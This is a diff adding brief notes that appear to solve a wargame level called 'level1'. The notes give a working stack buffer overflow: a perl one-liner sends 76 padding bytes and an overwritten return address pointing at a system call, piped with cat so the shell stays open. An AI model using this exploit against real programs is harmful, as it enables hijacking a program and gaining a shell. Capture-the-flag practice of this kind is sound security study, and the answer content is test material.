@@ -1,0 +1,8 @@
+objdump -d level1
+see the system function
+use buffer overload attack
+
+(perl -e 'print "p"x76 ."\x44\x84\x04\x08"' ; cat) | ./level1
+
+\x44... is the run address
+cat is used to avoid level1 to leave after the overflow
